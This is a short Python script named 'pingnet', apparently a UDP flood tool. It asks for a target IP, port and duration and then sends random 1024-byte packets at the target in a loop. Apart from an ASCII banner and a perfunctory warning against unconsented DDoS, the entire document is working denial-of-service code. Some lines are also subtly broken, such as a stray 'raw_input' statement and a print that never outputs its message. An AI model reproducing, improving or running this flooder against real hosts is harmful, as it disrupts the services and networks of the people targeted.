import os
import sys
import time
import socket
import random
raw_input

credits = ("""_______   __                                            __
/       \ /  |                                          /  |
$$$$$$$  |$$/  _______    ______   _______    ______   _$$ |_
$$ |__$$ |/  |/       \  /      \ /       \  /      \ / $$   |
$$    $$/ $$ |$$$$$$$  |/$$$$$$  |$$$$$$$  |/$$$$$$  |$$$$$$/
$$$$$$$/  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$    $$ |  $$ | __
$$ |      $$ |$$ |  $$ |$$ \__$$ |$$ |  $$ |$$$$$$$$/   $$ |/  |
$$ |      $$ |$$ |  $$ |$$    $$ |$$ |  $$ |$$       |  $$  $$/
$$/       $$/ $$/   $$/  $$$$$$$ |$$/   $$/  $$$$$$$/    $$$$/
                        /  \__$$ |
                        $$    $$/
                         $$$$$$/
""")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

os.system("clear")
print(credits)
print
print 
print("Welcome to pingnet use this program to stress an ip  for up to 500 seconds! Always type 80 when it asks for the piot USE AT YOU OWN RISK i am not responisble for what damage you may cause do not use this tool to ddos people and if you do get their consent to do so before. Though you shouldnt ddos them at all.--------------------------------------------------------------------------")
ip = raw_input("Target's IP: ")
port = input("Port: ")
dur = input("Time: ")
timeout = time.time() + dur
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port,))
        sent = sent + 1
        print
        "Sent %s packets to %s through port %s" % (sent, ip, port)
    except KeyboardInterrupt:
        sys.exit()
        

